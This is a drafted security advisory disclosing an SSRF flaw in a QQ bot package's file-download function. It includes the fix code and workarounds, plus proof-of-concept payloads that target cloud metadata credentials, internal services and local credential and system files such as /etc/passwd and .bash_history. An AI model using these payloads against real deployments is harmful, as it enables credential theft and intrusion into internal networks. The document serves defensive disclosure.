# Security Advisory: M1 — QQBot downloadFile Unrestricted SSRF

**Advisory ID:** GHSA-placeholder-M1
**CVE ID:** CVE-2026-XXXX (requested)
**Severity:** MEDIUM (CVSS 6.5) — Escalatable to HIGH with cloud metadata access
**Affected Package:** `@tencent-connect/openclaw-qqbot`
**Affected Versions:** All versions using `downloadFileOnce` in `image-server.ts`
**Patched Versions:** TBD
**Reporter:** Manteclaw (automated MCP security audit)
**Date:** 2026-05-14

---

## Summary

The `downloadFileOnce` function in `openclaw-qqbot/src/image-server.ts` fetches arbitrary URLs via `fetch()` without any allowlist, blocklist, or IP-range validation. This enables Server-Side Request Forgery (SSRF), allowing an attacker to make the bot request internal network resources, cloud metadata endpoints, and local services.

---

## Impact

- **Cloud Metadata Exfiltration** — On AWS, GCP, Alibaba Cloud, or Azure instances, attackers can retrieve IAM credentials from `169.254.169.254`.
- **Internal Service Scanning** — The bot can be used as a proxy to scan and interact with services on the host's internal network (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).
- **Local File Read (via file://)** — Depending on the `fetch()` implementation, `file:///etc/passwd` may be readable.
- **Denial of Service** — Attackers can force the bot to download large files or connect to slow/internal endpoints, consuming bandwidth and CPU.

---

## Reproduction Steps

### Step 1: Identify a vulnerable bot
Any `openclaw-qqbot` instance that processes image/file URLs from user messages is affected.

### Step 2: Send a message with a crafted URL
In a QQ group where the bot is present, send a message containing a URL that triggers the bot's download logic:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Or as an image message with the URL as the source.

### Step 3: Observe the bot's response
If the bot caches, previews, or processes the downloaded content, the cloud metadata will be exposed in:
- Message replies
- Error logs
- Cached file contents

### Proof of Concept: Cloud Metadata Exfiltration

```bash
# Simulate what the bot does
curl http://169.254.169.254/latest/meta-data/
# Returns: iam-info, instance-id, local-hostname, network, etc.

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# Returns: AccessKeyId, SecretAccessKey, Token
```

### Proof of Concept: Internal Service Scanning

```bash
# The bot will attempt to connect to these from the server:
curl http://127.0.0.1:22/       # SSH banner grab
curl http://127.0.0.1:6379/     # Redis info
curl http://127.0.0.1:9200/     # Elasticsearch
curl http://10.0.0.1:80/        # Internal web service
```

### Proof of Concept: Local File Read (variant)

If the environment's `fetch()` implementation supports `file://` protocol:
```
file:///etc/passwd
file:///proc/self/environ
file:///root/.bash_history
```

---

## Root Cause

**File:** `openclaw-qqbot/src/image-server.ts` (lines ~517-620)

```typescript
const response = await fetch(url, { signal: controller.signal });
```

No validation is performed on `url` before fetching:
- No blocklist for private IP ranges
- No blocklist for loopback addresses
- No blocklist for link-local/metadata endpoints
- No protocol scheme restrictions
- No DNS resolution check to detect resolved-to-internal-hostnames

---

## Suggested Fix

### Option A: URL blocklist with IP resolution (Recommended)

Implement a `isUrlAllowed()` helper that validates URLs before fetching:

```typescript
const BLOCKED_HOSTS = new Set([
  'localhost', '127.0.0.1', '0.0.0.0', '::1',
  '169.254.169.254',  // AWS/GCP/Alibaba metadata
  'metadata.google.internal',
  'metadata.oraclecloud.com',
]);

const BLOCKED_IP_RANGES = [
  { start: '10.0.0.0', end: '10.255.255.255' },     // RFC 1918
  { start: '172.16.0.0', end: '172.31.255.255' },   // RFC 1918
  { start: '192.168.0.0', end: '192.168.255.255' }, // RFC 1918
  { start: '127.0.0.0', end: '127.255.255.255' },   // Loopback
  { start: '169.254.0.0', end: '169.254.255.255' }, // Link-local
  { start: '100.64.0.0', end: '100.127.255.255' },  // CGNAT
];

function ipToLong(ip: string): number {
  return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
}

function isPrivateIp(ip: string): boolean {
  const long = ipToLong(ip);
  return BLOCKED_IP_RANGES.some(range => {
    const start = ipToLong(range.start);
    const end = ipToLong(range.end);
    return long >= start && long <= end;
  });
}

async function isUrlAllowed(urlStr: string): Promise<boolean> {
  try {
    const url = new URL(urlStr);
    
    // Only allow http: and https:
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      return false;
    }
    
    // Block known dangerous hosts
    if (BLOCKED_HOSTS.has(url.hostname)) {
      return false;
    }
    
    // Resolve DNS and block private IPs
    const { lookup } = await import('dns');
    const addresses = await new Promise<string[]>((resolve, reject) => {
      lookup(url.hostname, { all: true }, (err, addrs) => {
        if (err) reject(err);
        else resolve(addrs.map(a => a.address));
      });
    });
    
    if (addresses.some(isPrivateIp)) {
      return false;
    }
    
    return true;
  } catch {
    return false;
  }
}

// In downloadFileOnce:
if (!await isUrlAllowed(url)) {
  throw new Error(`SSRF blocked: URL ${url} is not allowed`);
}
const response = await fetch(url, { signal: controller.signal });
```

### Option B: Strict allowlist
Only permit URLs from known-safe domains (e.g., CDN domains, specific image hosts). This is more restrictive but eliminates all SSRF risk.

---

## Workaround (for operators)

Until patched:
1. Run the bot behind a firewall that blocks outbound requests to `169.254.169.254` and RFC 1918 ranges
2. Use a network namespace or container with restricted egress
3. Disable image/file download features if not needed
4. Monitor bot logs for unusual outbound requests

---

## Timeline

| Date | Action |
|------|--------|
| 2026-05-14 | Vulnerability discovered during automated MCP security audit |
| 2026-05-14 | Advisory drafted, ready for submission |
| TBD | Submitted to GitHub Security Advisories / Tencent VRP |
| TBD | CVE assigned |
| TBD | Patch released by maintainers |

---

## References

- CWE-918: Server-Side Request Forgery (SSRF)
- AWS Metadata Service: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
- SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

---

*Advisory drafted by Manteclaw — Lane 6 MCP Bug Bounty Scanner*
